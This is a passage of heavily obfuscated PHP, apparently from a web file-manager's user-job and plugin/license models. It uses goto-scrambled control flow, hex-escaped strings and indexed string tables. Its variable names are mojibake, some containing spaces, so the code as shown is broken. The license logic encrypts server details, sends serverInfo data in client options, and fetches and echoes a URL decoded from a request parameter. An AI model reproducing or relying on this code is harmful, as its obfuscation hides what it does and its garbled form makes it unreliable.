$this->field($BœıßÂÔı©[28])->where($b≠ãÔÈ©à…)->select(); goto fÆΩ›˘Ñô÷; bîﬁ„ÊÇÉ÷: return $B⁄ÜêîÖ…ı . "\50{$dŸÏ—µç Ã}\x29"; goto D©ÕæÑ∂ù ; fÆΩ›˘Ñô÷: $dÑôÀÊ∞à = array_to_keyvalue($dÑôÀÊ∞à, $BœıßÂÔı©[33], $BœıßÂÔı©[28]); if (!$dÑôÀÊ∞à || !in_array($B⁄ÜêîÖ…ı, $dÑôÀÊ∞à)) { return $B⁄ÜêîÖ…ı; } for ($dŸÏ—µç Ã = 0; $dŸÏ—µç Ã < count($dÑôÀÊ∞à); $dŸÏ—µç Ã++) { if (!in_array($B⁄ÜêîÖ…ı . "\x28{$dŸÏ—µç Ã}\x29", $dÑôÀÊ∞à)) { return $B⁄ÜêîÖ…ı . "\50{$dŸÏ—µç Ã}\51"; } } goto bîﬁ„ÊÇÉ÷; D©ÕæÑ∂ù : } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\x6a\x6f\x62\114\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\144\x65\163\143", "\x73\157\x72\164"); const JOB_KEY = "\163\x65\154\146\x4a\x6f\142\114\151\163\164"; public function listData($aªÖÀç⁄∞æ = false, $DÛõ€æ–‚Ü = "\x73\157\x72\x74", $cãÈ— ÿπ’ = false) { return parent::listData($aªÖÀç⁄∞æ, $DÛõ€æ–‚Ü, $cãÈ— ÿπ’); } public function remove($bƒùôÑÙπâ) { return parent::remove($bƒùôÑÙπâ); } public function add($cı¶πûø¬ã) { $d≠ØÁ⁄âò– =& $_SERVER[∞„˜ƒÑºª]; if ($this->findByName($cı¶πûø¬ã[$d≠ØÁ⁄âò–[28]])) { return !1; } $cı¶πûø¬ã[$d≠ØÁ⁄âò–[1537]] = $this->getSort(); return parent::insert($cı¶πûø¬ã); } private function getSort() { $FÂ–Â√ßﬂ√ =& $_SERVER[∞„˜ƒÑºª]; $E‡ò“èƒµÈ = parent::listData(); $c»©⁄ã±”— = array_to_keyvalue($E‡ò“èƒµÈ, $FÂ–Â√ßﬂ√[33], $FÂ–Â√ßﬂ√[1537]); return empty($c»©⁄ã±”—) ? 0 : max($c»©⁄ã±”—) + 1; } public function update($e¨¶«‹∑ªÎ, $AêŒ∫ÈÛàä) { $cù¬â∂âÿ‹ =& $_SERVER[∞„˜ƒÑºª]; $EÆëË«¥•Â = parent::listData($e¨¶«‹∑ªÎ); $a©ï¡âê¬Á = $this->findByName($AêŒ∫ÈÛàä[$cù¬â∂âÿ‹[28]]); if (!$EÆëË«¥•Â || $a©ï¡âê¬Á && $a©ï¡âê¬Á[$cù¬â∂âÿ‹[366]] != $EÆëË«¥•Â[$cù¬â∂âÿ‹[366]]) { return !1; } return parent::update($e¨¶«‹∑ªÎ, $AêŒ∫ÈÛàä); } public function setUserJob($AŸÃêëÑæÁ, $eî·à∂§Í›) { goto D≥øâŒ£˜•; fè≤Éî®Üâ: $f∑≤∑ºô¢ÿ = rtrim($f∑≤∑ºô¢ÿ, $F°›ˆç”˜©[47]); Model($F°›ˆç”˜©[1451])->metaSet($AŸÃêëÑæÁ, self::JOB_KEY, $f∑≤∑ºô¢ÿ); goto fùÓàÍöÕ€; cõñüÿ¨É›: $D˜ü¯èˆ÷Ì = array_to_keyvalue($BÂ≠ÚÎìø¡, $F°›ˆç”˜©[28]); $f∑≤∑ºô¢ÿ = $F°›ˆç”˜©[361]; foreach ($eî·à∂§Í› as $AÁãﬁèãàƒ) { if ($D˜ü¯èˆ÷Ì[$AÁãﬁèãàƒ]) { $f∑≤∑ºô¢ÿ .= $D˜ü¯èˆ÷Ì[$AÁãﬁèãàƒ][$F°›ˆç”˜©[366]] . $F°›ˆç”˜©[47]; } else { $EØ∆ÛÌ∏Ñ“ = $this->add($AÁãﬁèãàƒ); $f∑≤∑ºô¢ÿ .= $EØ∆ÛÌ∏Ñ“ . $F°›ˆç”˜©[47]; } } goto fè≤Éî®Üâ; D≥øâŒ£˜•: $F°›ˆç”˜© =& $_SERVER[∞„˜ƒÑºª]; if (!is_array($eî·à∂§Í›)) { $eî·à∂§Í› = array($eî·à∂§Í›); } $BÂ≠ÚÎìø¡ = parent::listData(); goto cõñüÿ¨É›; fùÓàÍöÕ€: } public function getUserJob($eÀñ†∂πô¿) { $BóÚíÒå…’ = Model($_SERVER[∞„˜ƒÑºª][1451])->metaGet($eÀñ†∂πô¿); return $this->getUserJobInfo($BóÚíÒå…’[self::JOB_KEY]); } public function getUserJobInfo($A”„ãÜﬁôÒ) { goto Bé¯ŸÍáŒ≠; Aì≈ﬂ›πÕÿ: return $d†º—æùÆ∂; goto C√êÜéÿ≈Ö; BÙ–ëÁÇúÒ: $E¥™ÕÉÃà— = array_remove_key($E¥™ÕÉÃà—, $c‡∑ô¬®Ìü[183]); $d†º—æùÆ∂ = array(); foreach ($eﬁÓ–¬òô⁄ as $AÖ’Œ¬Ê‡À) { if (isset($E¥™ÕÉÃà—[$AÖ’Œ¬Ê‡À])) { $d†º—æùÆ∂[] = $E¥™ÕÉÃà—[$AÖ’Œ¬Ê‡À]; } } goto Aì≈ﬂ›πÕÿ; Bé¯ŸÍáŒ≠: $c‡∑ô¬®Ìü =& $_SERVER[∞„˜ƒÑºª]; $eﬁÓ–¬òô⁄ = explode($c‡∑ô¬®Ìü[47], $A”„ãÜﬁôÒ); $E¥™ÕÉÃà— = parent::listData(); goto BÙ–ëÁÇúÒ; C√êÜéÿ≈Ö: } } goto B∑†–íµŒ∞; bÆ¿±¡À¥Œ: function ActionCallHook($FáÿÆ∂ìÍ) { goto b◊˘ÒÖ¯µ‚; a¡å£òéº : $e™éÂïùﬂÃ = $DëŸÑ¢¡ÔÌ ? json_decode($DëŸÑ¢¡ÔÌ, !0) : $e™éÂïùﬂÃ; $GLOBALS[$D°è¬¶ñ„è[18]] = 0; return $e™éÂïùﬂÃ; goto b°»ªÖˆÿ; bÍﬁØâ†Ñ¡: $GLOBALS[$D°è¬¶ñ„è[18]] = 1; $e™éÂïùﬂÃ = ActionApply($FáÿÆ∂ìÍ, $Cæ‚ß®∏Øç); $DëŸÑ¢¡ÔÌ = ob_get_clean(); goto a¡å£òéº ; b◊˘ÒÖ¯µ‚: $D°è¬¶ñ„è =& $_SERVER[ÔÒÀÃÆ›—ü]; ob_start(); $Cæ‚ß®∏Øç = array_slice(func_get_args(), 1); goto bÍﬁØâ†Ñ¡; b°»ªÖˆÿ: } function beforeShutdown() { Hook::trigger($_SERVER[ÔÒÀÃÆ›—ü][19]); } function beforeShutdownError($aÊ©¡èÁáà = false, $C˘ÌûÓÍÖå = '', $a¨øœå≠Ü≤ = '', $bØÓÚæééÙ = 0) { $Dß÷§≥É¿â =& $_SERVER[ÔÒÀÃÆ›—ü]; switch ($aÊ©¡èÁáà) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $bò´Ù»’∆• = $Dß÷§≥É¿â[20]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $bò´Ù»’∆• = $Dß÷§≥É¿â[21]; break; case E_STRICT: $bò´Ù»’∆• = $Dß÷§≥É¿â[22]; break; case E_NOTICE: case E_USER_NOTICE: $bò´Ù»’∆• = $Dß÷§≥É¿â[23]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $bò´Ù»’∆• = $Dß÷§≥É¿â[24]; break; default: break; } if (!$bò´Ù»’∆• || $bò´Ù»’∆• == $Dß÷§≥É¿â[23] || $bò´Ù»’∆• == $Dß÷§≥É¿â[24]) { return; } $a¨øœå≠Ü≤ = $Dß÷§≥É¿â[2] . str_replace(BASIC_PATH, $Dß÷§≥É¿â[25], $a¨øœå≠Ü≤); $BÑÎÎƒãØµ = $bò´Ù»’∆• . $Dß÷§≥É¿â[26] . $C˘ÌûÓÍÖå . $Dß÷§≥É¿â[26] . $a¨øœå≠Ü≤ . $Dß÷§≥É¿â[26] . $bØÓÚæééÙ; write_log($BÑÎÎƒãØµ . $Dß÷§≥É¿â[27] . get_caller_msg(), $Dß÷§≥É¿â[16]); } goto A€£·ä¬∏÷; CÇ’·≈ß•ã: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x70\x6c\x75\147\x69\x6e\114\151\163\x74"; public $field = array("\x6e\141\155\x65", "\163\164\141\x74\x75\x73", "\162\x65\x67\151\145\163\x74", "\x63\157\x6e\146\151\147"); private $versionData = array(); private $version = "\x41"; public function loadList($c∂ﬂÎá‰à◊ = false) { $c®ﬁΩ÷ÙßŸ = array_to_keyvalue($this->listData(), $_SERVER[©Ç‡ÆÑ„òπ][0]); if ($c∂ﬂÎá‰à◊) { return $c®ﬁΩ÷ÙßŸ[$c∂ﬂÎá‰à◊]; } return $c®ﬁΩ÷ÙßŸ; } public function init() { goto A›ﬁ∆¿ÛÂí; dáÉ£≈Ï∞: Hook::bind($c≈¢ﬁïíÇ÷[16], $c≈¢ﬁïíÇ÷[17]); goto D‚‰Ú˘≈°ª; D∂£òÛ°≈˘: $this->assignCopyright(); $this->disableCheck(); Hook::bind($c≈¢ﬁïíÇ÷[14], $c≈¢ﬁïíÇ÷[15]); goto dáÉ£≈Ï∞; fö∆‘ß⁄Ô : if (isset($_GET[$c≈¢ﬁïíÇ÷[5]]) && in_array(strtolower(ACTION), $Fâ¬ﬁ™Ö’’)) { $C∞ΩÑÕ∞®¡ = hash_decode($_GET[$c≈¢ﬁïíÇ÷[5]]); header($c≈¢ﬁïíÇ÷[6]); if ($GLOBALS[$c≈¢ﬁïíÇ÷[7]] && $C∞ΩÑÕ∞®¡ && substr($C∞ΩÑÕ∞®¡, 0, 4) == $c≈¢ﬁïíÇ÷[8]) { $C∞ΩÑÕ∞®¡ = str_replace($c≈¢ﬁïíÇ÷[9], $c≈¢ﬁïíÇ÷[10], $C∞ΩÑÕ∞®¡); $bÈ¶÷æ≈– = url_request($C∞ΩÑÕ∞®¡, $c≈¢ﬁïíÇ÷[11], !1, !1, !1, !1, 2); if ($bÈ¶÷æ≈–[$c≈¢ﬁïíÇ÷[12]] && strstr($bÈ¶÷æ≈–[$c≈¢ﬁïíÇ÷[12]], $c≈¢ﬁïíÇ÷[13])) { echo $bÈ¶÷æ≈–[$c≈¢ﬁïíÇ÷[12]]; } } die; } $this->checkDataInit(); $this->checkVersion(); goto D∂£òÛ°≈˘; CÂàÿ‡›•Ÿ: $this->dataAllow(); $EÏ∂∑µ¨µÜ = $this->checkPlugin($EÏ∂∑µ¨µÜ); foreach ($EÏ∂∑µ¨µÜ as $EâßãÃû„· => $Dßò¨§ƒÑ˜) { $BÖµ∆ŸÊ—õ = $this->appAllow($EâßãÃû„·, $Dßò¨§ƒÑ˜); if (!$BÖµ∆ŸÊ—õ) { continue; } foreach ($Dßò¨§ƒÑ˜[$c≈¢ﬁïíÇ÷[1]] as $f¶Ñò∂ïëØ => $e§Î¡ãÜﬁë) { Hook::bind($f¶Ñò∂ïëØ, $e§Î¡ãÜﬁë); } } goto aÁÂ”ÍÀÈÀ; A›ﬁ∆¿ÛÂí: $c≈¢ﬁïíÇ÷ =& $_SERVER[©Ç‡ÆÑ„òπ]; $EÏ∂∑µ¨µÜ = $this->loadList(); $this->dataCheck(); goto CÂàÿ‡›•Ÿ; aÁÂ”ÍÀÈÀ: Hook::trigger($c≈¢ﬁïíÇ÷[2]); Hook::trigger(ACTION); $Fâ¬ﬁ™Ö’’ = array($c≈¢ﬁïíÇ÷[3], $c≈¢ﬁïíÇ÷[4]); goto fö∆‘ß⁄Ô ; D‚‰Ú˘≈°ª: } public function optionsFilter($FÀÿÓ‹’÷¬) { goto AΩ»ö†áÒß; Fë∂êüèÿﬁ: foreach ($dﬁÒûœÉÊ… as $A«Âå≠èÕØ) { $B“à≥ÇÓ§´ = $GLOBALS[$bÖÀÒ◊åú≤[43]][$bÖÀÒ◊åú≤[44]][$A«Âå≠èÕØ]; if (isset($e£°Ìñ¥”à[$A«Âå≠èÕØ])) { $B“à≥ÇÓ§´ = $e£°Ìñ¥”à[$A«Âå≠èÕØ]; } $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[45]][$bÖÀÒ◊åú≤[46]][$A«Âå≠èÕØ] = $B“à≥ÇÓ§´; } $e∫ú ‚¨¢‰ = $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[45]][$bÖÀÒ◊åú≤[46]][$bÖÀÒ◊åú≤[31]]; unset($FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[45]][$bÖÀÒ◊åú≤[47]][$bÖÀÒ◊åú≤[48]]); goto dïÇË∞“†á; eÀ ÉÕûâ≈: $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[57]][$bÖÀÒ◊åú≤[58]] = Action($bÖÀÒ◊åú≤[59])->accessToken(); $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[57]][$bÖÀÒ◊åú≤[60]] = md5(BASIC_PATH . $e£°Ìñ¥”à[$bÖÀÒ◊åú≤[61]]); $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[57]][$bÖÀÒ◊åú≤[62]] = base64_encode(serverInfo()); goto f‚É‡«¥òŸ; dïÇË∞“†á: unset($FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[45]][$bÖÀÒ◊åú≤[46]][$bÖÀÒ◊åú≤[31]]); unset($FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[45]][$bÖÀÒ◊åú≤[46]][$bÖÀÒ◊åú≤[49]]); $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[45]][$bÖÀÒ◊åú≤[46]][$bÖÀÒ◊åú≤[50]] = array($bÖÀÒ◊åú≤[51] => (int) $e∫ú ‚¨¢‰[$bÖÀÒ◊åú≤[52]], $bÖÀÒ◊åú≤[53] => array_filter(_get($e∫ú ‚¨¢‰, $bÖÀÒ◊åú≤[54], array())), $bÖÀÒ◊åú≤[55] => (int) _get($e∫ú ‚¨¢‰, $bÖÀÒ◊åú≤[56], 0)); goto eÀ ÉÕûâ≈; AΩ»ö†áÒß: $bÖÀÒ◊åú≤ =& $_SERVER[©Ç‡ÆÑ„òπ]; $e£°Ìñ¥”à = Model($bÖÀÒ◊åú≤[18])->get(); $dﬁÒûœÉÊ… = array($bÖÀÒ◊åú≤[19], $bÖÀÒ◊åú≤[20], $bÖÀÒ◊åú≤[21], $bÖÀÒ◊åú≤[22], $bÖÀÒ◊åú≤[23], $bÖÀÒ◊åú≤[24], $bÖÀÒ◊åú≤[25], $bÖÀÒ◊åú≤[26], $bÖÀÒ◊åú≤[27], $bÖÀÒ◊åú≤[28], $bÖÀÒ◊åú≤[29], $bÖÀÒ◊åú≤[30], $bÖÀÒ◊åú≤[31], $bÖÀÒ◊åú≤[32], $bÖÀÒ◊åú≤[33], $bÖÀÒ◊åú≤[34], $bÖÀÒ◊åú≤[35], $bÖÀÒ◊åú≤[36], $bÖÀÒ◊åú≤[37], $bÖÀÒ◊åú≤[38], $bÖÀÒ◊åú≤[39], $bÖÀÒ◊åú≤[40], $bÖÀÒ◊åú≤[41], $bÖÀÒ◊åú≤[42]); goto Fë∂êüèÿﬁ; f‚É‡«¥òŸ: $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[57]][$bÖÀÒ◊åú≤[63]] = $this->version; if ($e£°Ìñ¥”à[$bÖÀÒ◊åú≤[63]] != $bÖÀÒ◊åú≤[64]) { $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[57]][$bÖÀÒ◊åú≤[65]] = $e£°Ìñ¥”à[$bÖÀÒ◊åú≤[65]]; $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[57]][$bÖÀÒ◊åú≤[66]] = $e£°Ìñ¥”à[$bÖÀÒ◊åú≤[66]]; $cˆÉÏ–ﬂÌÂ = rand_string(10) . $this->version . rand_string(5); $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[45]][$bÖÀÒ◊åú≤[67]][$bÖÀÒ◊åú≤[68]] = $this->encode($cˆÉÏ–ﬂÌÂ, $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[57]][$bÖÀÒ◊åú≤[60]]); } if ($this->version == $bÖÀÒ◊åú≤[64]) { $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[45]][$bÖÀÒ◊åú≤[46]][$bÖÀÒ◊åú≤[50]][$bÖÀÒ◊åú≤[56]] = 0; } goto d‡¬‹›ÍÊ…; d‡¬‹›ÍÊ…: $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[57]][$bÖÀÒ◊åú≤[69]] = _get($this->versionData, $bÖÀÒ◊åú≤[70], $bÖÀÒ◊åú≤[71]); if ($GLOBALS[$bÖÀÒ◊åú≤[7]] && $this->config[$bÖÀÒ◊åú≤[72]]) { $FÀÿÓ‹’÷¬[$bÖÀÒ◊åú≤[57]][$bÖÀÒ◊åú≤[73]] = WEB_ROOT; } return $FÀÿÓ‹’÷¬; goto eã≈îÎ≥„«; eã≈îÎ≥„«: } private function assignCopyright() { goto a¥Ωº≈≤Ø¡; bä¿ÜÆΩüÜ: $cë‰î¯‘î´ = Model($d÷ãÎêÎñò[18])->get(); $Dä„ª©ã÷Û = array($d÷ãÎêÎñò[80] => $cë‰î¯‘î´[$d÷ãÎêÎñò[19]], $d÷ãÎêÎñò[81] => $cë‰î¯‘î´[$d÷ãÎêÎñò[20]], $d÷ãÎêÎñò[82] => $d÷ãÎêÎñò[71]); if (ACTION == $d÷ãÎêÎñò[3]) { $fá¿ã‹ª˜∂ = $this->userCount(); $A÷èŸ∏ùµô = $d÷ãÎêÎñò[83] . $fá¿ã‹ª˜∂ . $d÷ãÎêÎñò[84]; if ($fá¿ã‹ª˜∂ >= 10000) { $A÷èŸ∏ùµô = $d÷ãÎêÎñò[85]; } $Dä„ª©ã÷Û[$d÷ãÎêÎñò[86]] = $A÷èŸ∏ùµô; } goto Eß´◊ôåü¢; Eß´◊ôåü¢: foreach ($EÕÜ¯á„êπ as $eªçôÃï≤≤) { if (!isset($cë‰î¯‘î´[$eªçôÃï≤≤]) || !$cë‰î¯‘î´[$eªçôÃï≤≤]) { continue; } $Dä„ª©ã÷Û[$eªçôÃï≤≤] = $cë‰î¯‘î´[$eªçôÃï≤≤]; } I18n::set($Dä„ª©ã÷Û); goto Aâ–¶ëû≤Í; a¥Ωº≈≤Ø¡: $d÷ãÎêÎñò =& $_SERVER[©Ç‡ÆÑ„òπ]; if ($this->version == $d÷ãÎêÎñò[64]) { return; } $EÕÜ¯á„êπ = array($d÷ãÎêÎñò[74], $d÷ãÎêÎñò[75], $d÷ãÎêÎñò[76], $d÷ãÎêÎñò[77], $d÷ãÎêÎñò[78], $d÷ãÎêÎñò[79]); goto bä¿ÜÆΩüÜ; Aâ–¶ëû≤Í: } private function checkDataInit() { goto eúÇ‘¿å¡—; AÖ¿¨”©∆™: $fÆÖ˜˜‡öÖ = $this->encode(json_encode($Bîßó’ìÔâ), $Câ†áúà©Œ); $DœºÜﬂ™áÂ = $this->loadList(); $E¬èéµŸ∫Œ = $DœºÜﬂ™áÂ[$bﬂ∏ƒüªﬂë[121]]; goto aÔ¥Áóˆåù; FááÉ€ÔΩ‚: $d¢≥ëÓÜù∑ = $Bê≥˘Áá•É . $bÎùØ„îÍÁ[$bﬂ∏ƒüªﬂë[63]] . $bÎùØ„îÍÁ[$bﬂ∏ƒüªﬂë[114]]; $bÎùØ„îÍÁ[$bﬂ∏ƒüªﬂë[65]] = strrev(base64_encode(Mcrypt::encode($d¢≥ëÓÜù∑, $bﬂ∏ƒüªﬂë[116]))); $CÍ∞÷áñèÉ = rand_string(16); goto C⁄§Œò≠Ã; C⁄§Œò≠Ã: $eÀ ÚµÙãœ = $CÍ∞÷áñèÉ . $bÎùØ„îÍÁ[$bﬂ∏ƒüªﬂë[63]] . Mcrypt::encode(md5($bÎùØ„îÍÁ[$bﬂ∏ƒüªﬂë[111]]), $CÍ∞÷áñèÉ); $bÎùØ„îÍÁ[$bﬂ∏ƒüªﬂë[66]] = base64_encode(strrev(Mcrypt::encode($eÀ ÚµÙãœ, $bﬂ∏ƒüªﬂë[117]))); if ($Bîßó’ìÔâ[$bﬂ∏ƒüªﬂë[118]] && $Bîßó’ìÔâ[$bﬂ∏ƒüªﬂë[118]] >= 1) { Model($bﬂ∏ƒüªﬂë[18])->setDeep($bﬂ∏ƒüªﬂë[119], $bﬂ∏ƒüªﬂë[120]); } goto c‡ëƒä«õÜ; e…–¿ƒå¢á: $bëπÖ§çÊá = Mcrypt::decode($bﬂ∏ƒüªﬂë[92], $bﬂ∏ƒüªﬂë[57]); $A¶áï◊œÖˆ = array($bﬂ∏ƒüªﬂë[90] => $F∞¨ÖØÎ÷¯[$bﬂ∏ƒüªﬂë[90]], $bﬂ∏ƒüªﬂë[93] => $_SERVER[$bﬂ∏ƒüªﬂë[94]], $bﬂ∏ƒüªﬂë[95] => INSTALL_CHANNEL, $bﬂ∏ƒüªﬂë[96] => rand_string(16)); $FØÇ„ΩÜ§„ = md5(BASIC_PATH . $AçÕíˆÔ»Ë); goto bÖ⁄áÂ™èñ; cÌ≈ﬁµï√¨: $bÎùØ„îÍÁ = array($bﬂ∏ƒüªﬂë[111] => $A¶áï◊œÖˆ[$bﬂ∏ƒüªﬂë[90]], $bﬂ∏ƒüªﬂë[112] => $Bîßó’ìÔâ[$bﬂ∏ƒüªﬂë[113]], $bﬂ∏ƒüªﬂë[114] => rand_string(16), $bﬂ∏ƒüªﬂë[63] => $Bîßó’ìÔâ[$bﬂ∏ƒüªﬂë[115]]); if ($A¶áï◊œÖˆ[$bﬂ∏ƒüªﬂë[96]]) { $bÎùØ„îÍÁ[$bﬂ∏ƒüªﬂë[114]] = $A¶áï◊œÖˆ[$bﬂ∏ƒüªﬂë[96]]; } $Bê≥˘Áá•É = substr(md5($bÎùØ„îÍÁ[$bﬂ∏ƒüªﬂë[112]]), 10, 10); goto FááÉ€ÔΩ‚; eúÇ‘¿å¡—: $bﬂ∏ƒüªﬂë =& $_SERVER[©Ç‡ÆÑ„òπ]; if (ACTION != $bﬂ∏ƒüªﬂë[87] || !$GLOBALS[$bﬂ∏ƒüªﬂë[7]]) { return; } $F∞¨ÖØÎ÷¯ = $GLOBALS[$bﬂ∏ƒüªﬂë[88]]; goto eŒ˘ˆ¥‹¥“; aÔ¥Áóˆåù: $fæËÚº∏ûﬂ = $E¬èéµŸ∫Œ[$bﬂ∏ƒüªﬂë[43]]; $fæËÚº∏ûﬂ = array(); $fæËÚº∏ûﬂ[$f⁄¿íãﬂöâ] = $fÆÖ˜˜‡öÖ; goto b•∏◊∂ΩÜ∂; eŒ˘ˆ¥‹¥“: if (isset($F∞¨ÖØÎ÷¯[$bﬂ∏ƒüªﬂë[89]])) { $this->dataReset(); die; } if (!isset($F∞¨ÖØÎ÷¯[$bﬂ∏ƒüªﬂë[90]]) || strlen($F∞¨ÖØÎ÷¯[$bﬂ∏ƒüªﬂë[90]]) != 16) { show_json($bﬂ∏ƒüªﬂë[91] . $F∞¨ÖØÎ÷¯[$bﬂ∏ƒüªﬂë[90]], !1); } $AçÕíˆÔ»Ë = Model($bﬂ∏ƒüªﬂë[18])->get($bﬂ∏ƒüªﬂë[61]); goto e…–¿ƒå¢á; c‡ëƒä«õÜ: Model($bﬂ∏ƒüªﬂë[18])->set($bÎùØ„îÍÁ); $Câ†áúà©Œ = md5(BASIC_PATH . strrev($AçÕíˆÔ»Ë) . $bÎùØ„îÍÁ[$bﬂ∏ƒüªﬂë[112]]); $f⁄¿íãﬂöâ = strrev(substr($Câ†áúà©Œ, 10, 16)); goto AÖ¿¨”©∆™; bÖ⁄áÂ™èñ: if ($F∞¨ÖØÎ÷¯[$bﬂ∏ƒüªﬂë[97]] == $bﬂ∏ƒüªﬂë[98]) { $D¯€ÒøÕÃá = Mcrypt::encode($FØÇ„ΩÜ§„, $bﬂ∏ƒüªﬂë[99]); $aﬁ§åé◊”å = json_encode($A¶áï◊œÖˆ); $aﬁ§åé◊”å = $this->encode($aﬁ§åé◊”å, $FØÇ„ΩÜ§„ . $bﬂ∏ƒüªﬂë[100], 3); $fÑÆ‹ÓÌ∆ß = $bëπÖ§çÊá . $bﬂ∏ƒüªﬂë[101] . $D¯€ÒøÕÃá . $bﬂ∏ƒüªﬂë[102]; show_json($fÑÆ‹ÓÌ∆ß . $aﬁ§åé◊”å, !0, $bëπÖ§çÊá); } else { if ($F∞¨ÖØÎ÷¯[$bﬂ∏ƒüªﬂë[97]] == $bﬂ∏ƒüªﬂë[103]) { $eÒ›∑Ü“«„ = substr(md5($bﬂ∏ƒüªﬂë[104], $FØÇ„ΩÜ§„), 12, 15) . $bﬂ∏ƒüªﬂë[105]; $aﬁ§åé◊”å = $this->decode($F∞¨ÖØÎ÷¯[$bﬂ∏ƒüªﬂë[106]], $eÒ›∑Ü“«„, 2); $eﬂ¿ë‹äŸ¢ = json_decode($aﬁ§åé◊”å, !0); if (!is_array($eﬂ¿ë‹äŸ¢) || !is_array($eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[12]]) || $eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[90]] != !0) { $b¶üàçìÊ∂ = $bﬂ∏ƒüªﬂë[107]; $dÎ€ÔΩê∂ﬂ = $eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[12]] ? $bﬂ∏ƒüªﬂë[108] . $eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[12]] : $b¶üàçìÊ∂; show_json($dÎ€ÔΩê∂ﬂ, !1); } else { $A¶áï◊œÖˆ[$bﬂ∏ƒüªﬂë[96]] = $eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[12]][$bﬂ∏ƒüªﬂë[109]]; } } else { $eﬂ¿ë‹äŸ¢ = url_request($bëπÖ§çÊá, $bﬂ∏ƒüªﬂë[11], $A¶áï◊œÖˆ, !1, !1, !0, 10); $eﬂ¿ë‹äŸ¢ = $eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[12]]; } } if (!is_array($eﬂ¿ë‹äŸ¢) || !is_array($eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[12]]) || $eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[90]] != !0) { $b¶üàçìÊ∂ = LNG($bﬂ∏ƒüªﬂë[110]); $dÎ€ÔΩê∂ﬂ = $eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[12]] ? $bﬂ∏ƒüªﬂë[108] . $eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[12]] : $b¶üàçìÊ∂; show_json($dÎ€ÔΩê∂ﬂ, !1); } $Bîßó’ìÔâ = $eﬂ¿ë‹äŸ¢[$bﬂ∏ƒüªﬂë[12]]; goto cÌ≈ﬁµï√¨; b•∏◊∂ΩÜ∂: $this->update($E¬èéµŸ∫Œ[$bﬂ∏ƒüªﬂë[122]], array($bﬂ∏ƒüªﬂë[123] => $fæËÚº∏ûﬂ)); show_json(LNG($bﬂ∏ƒüªﬂë[124]), !0); goto BñåøÎ†ÙÇ; BñåøÎ†ÙÇ: } private function dataReset() { $CˆÃÔàƒªû =& $_SERVER[©Ç‡ÆÑ„òπ]; Model($CˆÃÔàƒªû[18])->set(array($CˆÃÔàƒªû[111] => $CˆÃÔàƒªû[71], $CˆÃÔàƒªû[112] => $CˆÃÔàƒªû[71], $CˆÃÔàƒªû[63] => $CˆÃÔàƒªû[64], $CˆÃÔàƒªû[65] => $CˆÃÔàƒªû[71], $CˆÃÔàƒªû[66] => $CˆÃÔàƒªû[71])); Model($CˆÃÔàƒªû[18])->setDeep($CˆÃÔàƒªû[119], $CˆÃÔàƒªû[125]); $this->versionData = array(); $this->version = $CˆÃÔàƒªû[64]; } private function dataCheck() { goto A“∑∏†Ω¥‘; AëπÁ˘áûê: $Eëåä„–äÀ = md5(BASIC_PATH . strrev($B◊ﬁ‹”¬â®) . $aì•‘ ∑èË[$e˘åëóÇä±[112]]); $a±√´ƒø˜ø = strrev(substr($Eëåä„–äÀ, 10, 16)); $eãÉé”≠´§ = $this->decode($Fﬂ««ß·⁄¿[$e˘åëóÇä±[43]][$a±√´ƒø˜ø], $Eëåä„–äÀ); goto DÒÿ©∫®—è; DÒÿ©∫®—è: $eãÉé”≠´§ = json_decode($eãÉé”≠´§, !0); if (!is_array($eãÉé”≠´§)) { return $this->dataReset(); } $E∞ÙÍÙ≠è‰ = strtotime($eãÉé”≠´§[$e˘åëóÇä±[126]]); goto f≈èü⁄ßöˆ; dÔ‰…‚äúŸ: $B◊ﬁ‹”¬â® = Model($e˘åëóÇä±[18])->get($e˘åëóÇä±[61]); $aÚºƒÊ∫†Ω = array_to_keyvalue($this->listData(), $e˘åëóÇä±[0]); $Fﬂ««ß·⁄¿ = $aÚºƒÊ∫†Ω[$e˘åëóÇä±[121]]; goto AëπÁ˘áûê; f≈èü⁄ßöˆ: if (time() >= $E∞ÙÍÙ≠è‰) { return $this->dataReset(); } $this->versionData = $eãÉé”≠´§; $this->version = $aì•‘ ∑èË[$e˘åëóÇä±[63]]; goto CÑÀºÙ´óÉ; A“∑∏†Ω¥‘: $e˘åëóÇä± =& $_SERVER[©Ç‡ÆÑ„òπ]; $aì•‘ ∑èË = Model($e˘åëóÇä±[18])->get(); if ($aì•‘ ∑èË[$e˘åëóÇä±[63]] == $e˘åëóÇä±[64]) { $this->dataAllow(); return; } goto dÔ‰…‚äúŸ; CÑÀºÙ´óÉ: } private function dataAllow() { goto eÕÈÌﬂäÑ ; 